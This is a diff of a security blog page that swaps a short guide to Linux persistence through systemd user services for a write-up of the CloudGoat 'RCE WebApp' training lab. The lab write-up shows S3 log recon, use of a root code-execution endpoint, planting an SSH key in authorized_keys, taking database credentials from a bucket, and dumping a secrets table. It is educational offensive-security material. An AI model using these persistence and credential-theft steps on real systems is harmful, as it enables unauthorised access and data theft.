@@ -6,15 +6,15 @@
   <meta http-equiv="cache-control" content="no-cache">
   <meta http-equiv="expires" content="0">
   
-  <title>Persistence by Abusing systemd Services | zerrox&#39; security blog</title>
+  <title>CloudGoat - RCE WebApp | zerrox&#39; security blog</title>
   <meta name="author" content="zerrox9">
   
-  <meta name="description" content="A short showcase of user-level persistence through systemd user services on a Linux host.">
+  <meta name="description" content="Writeup for CloudGoat&#39;s RCE WebApp.">
   
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-  <meta property="og:title" content="Persistence by Abusing systemd Services"/>
+  <meta property="og:title" content="CloudGoat - RCE WebApp"/>
   <meta property="og:site_name" content="zerrox&#39; security blog"/>
 
   
@@ -115,7 +115,7 @@
 
 	
 		<div class="page-header">
-			<h1> Persistence by Abusing systemd Services</h1>
+			<h1> CloudGoat - RCE WebApp</h1>
 		</div>
 	
 
@@ -132,30 +132,44 @@
 	<div class="mypage">		
 	  
 		 <div class="alert alert-success description">
-			<i class="fa fa-info-circle"></i> A short showcase of user-level persistence through systemd user services on a Linux host.
+			<i class="fa fa-info-circle"></i> Writeup for CloudGoat's RCE WebApp.
 		 </div> <!-- alert -->
 	  		
 
-	  <h1 id="Persistence-by-Abusing-systemd-Services"><a href="#Persistence-by-Abusing-systemd-Services" class="headerlink" title="Persistence by Abusing systemd Services"></a>Persistence by Abusing systemd Services</h1><p>User-level systemd services live in:</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/.config/systemd/user/</span><br></pre></td></tr></table></figure>
+	  <h1 id="CloudGoat-RCE-WebApp"><a href="#CloudGoat-RCE-WebApp" class="headerlink" title="CloudGoat - RCE WebApp"></a>CloudGoat - RCE WebApp</h1><h5 id="Difficulty-HARD"><a href="#Difficulty-HARD" class="headerlink" title="Difficulty: HARD"></a>Difficulty: HARD</h5><h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>Listing and pulling the logging bucket with the <code>lara</code> profile:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aws s3 <span class="built_in">ls</span> --profile lara</span><br><span class="line">aws s3 <span class="built_in">ls</span> s3://cg-logs-s3-bucket-cgidq0qfidvtbb --recursive --profile lara</span><br><span class="line">aws s3 <span class="built_in">cp</span> s3://cg-logs-s3-bucket-cgidq0qfidvtbb . --profile lara</span><br><span class="line"><span class="built_in">cat</span> 555_elasticloadbalancing_us-east-1_app.cg.......log</span><br></pre></td></tr></table></figure>
 
-<p>If the directory does not exist yet, create it first:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p ~/.config/systemd/user</span><br></pre></td></tr></table></figure>
+<p>The logfile reveals a website and a hidden endpoint:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cg-lb-cgidq0qfidvtbb-217357281.us-east-1.elb.amazonaws.com/mkja1xijqf0abo1h9glg.html</span><br></pre></td></tr></table></figure>
 
-<p>Create a user service file:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi ~/.config/systemd/user/persistence.service</span><br></pre></td></tr></table></figure>
+<h2 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access"></a>Initial Access</h2><p>Confirming code execution on the hidden endpoint:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id =&gt; uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Unit]</span></span><br><span class="line"><span class="attr">Description</span>=Persistence service</span><br><span class="line"></span><br><span class="line"><span class="section">[Service]</span></span><br><span class="line"><span class="attr">Type</span>=<span class="literal">on</span>eshot</span><br><span class="line"><span class="attr">ExecStart</span>=/bin/bash -c <span class="string">&#x27;echo pwned&#x27;</span></span><br><span class="line"><span class="attr">RemainAfterExit</span>=<span class="literal">yes</span></span><br><span class="line"></span><br><span class="line"><span class="section">[Install]</span></span><br><span class="line"><span class="attr">WantedBy</span>=default.target</span><br></pre></td></tr></table></figure>
+<h2 id="Gaining-Access"><a href="#Gaining-Access" class="headerlink" title="Gaining Access"></a>Gaining Access</h2><p>Generating a keypair and dropping the public key into <code>authorized_keys</code> via the RCE, then locating and connecting to the instance:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t ed25519</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-public-key&quot;</span> &gt;&gt; /home/ubuntu/.ssh/authorized_keys</span><br><span class="line">aws ec2 describe-instances --region us-east-1 --profile lara</span><br><span class="line">ssh -i ed25519 ubuntu@&lt;public-ec2-ip&gt;</span><br></pre></td></tr></table></figure>
 
-<p>Reload the user systemd manager and enable the service:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl --user daemon-reload</span><br><span class="line">systemctl --user <span class="built_in">enable</span> persistence.service</span><br></pre></td></tr></table></figure>
+<h2 id="Pivoting"><a href="#Pivoting" class="headerlink" title="Pivoting"></a>Pivoting</h2><p>Pulling database credentials from a secret bucket:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aws s3 <span class="built_in">ls</span> s3://cg-secret-s3-bucket-cgidq0qfidvtbb --recursive</span><br><span class="line">aws s3 <span class="built_in">cp</span> s3://cg-secret-s3-bucket-cgidq0qfidvtbb/db.txt .</span><br><span class="line"><span class="built_in">cat</span> db.txt</span><br></pre></td></tr></table></figure>
 
-<p><code>enable</code> does not run the service immediately. It creates the user-level autostart link, so the service starts the next time the user’s <code>default.target</code> is reached. In most setups, that means the next login for that user.</p>
-<p>To start it immediately as well:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl --user start persistence.service</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">database credentials</span><br></pre></td></tr></table></figure>
 
-<p>This provides persistence across logins and reboots where the user logs in again. If the service should start after boot without an interactive login, lingering must be enabled for that account:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">loginctl enable-linger <span class="string">&quot;<span class="variable">$USER</span>&quot;</span></span><br></pre></td></tr></table></figure>
+<p>Using the credentials to reach the RDS instance:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aws rds describe-db-instances</span><br><span class="line">psql postgresql://cgadmin:Purplepwny2029@cg-rds-instance-cgidq0qfidvtbb.ce9io8wgur2g.us-east-1.rds.amazonaws.com:5432/cloudgoat</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\dt</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> sensitive_information;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>name</th>
+<th>value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Super-secret-passcode</td>
+<td>V!C70RY-4hy2809gnbv40h8g4b</td>
+</tr>
+</tbody></table>
 
 	  <div class="article-footer-copyright">
 
@@ -173,13 +187,12 @@
 
     
     
-    <a href="/2026/07/13/2026-07-13-dns-data-exfil/" type="button" class="btn btn-default"><i
-                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
     
 
     <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
     
-    <a href="/2026/06/04/2026-06-04-silentium/" type="button" class="btn btn-default ">Next<i
+    <a href="/2026/09/08/2026-09-08-orion-htb/" type="button" class="btn btn-default ">Next<i
                 class="fa fa-arrow-circle-o-right"></i></a>
     
 
@@ -213,7 +226,7 @@
 	
 	<div class="meta-widget">
 	<i class="fa fa-clock-o"></i>
-	2026-06-27 
+	2026-09-18 
 	</div>
 	
 
@@ -224,7 +237,7 @@
     <ul id="categorys" class="tag_box list-unstyled collapse in">
           
   <li>
-    <li><a href="/categories/security/">security<span>4</span></a></li>
+    <li><a href="/categories/cloud/">cloud<span>1</span></a></li>
   </li>
 
     </ul>
@@ -237,7 +250,7 @@
 	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
     <ul id="tags" class="tag_box list-unstyled collapse in">	  
 	    
-  <li><a href="/tags/security/">security<span>5</span></a></li>
+  <li><a href="/tags/security/">security<span>5</span></a></li> <li><a href="/tags/cloudgoat/">cloudgoat<span>1</span></a></li> <li><a href="/tags/aws/">aws<span>1</span></a></li>
     </ul>
 	</div>
 		
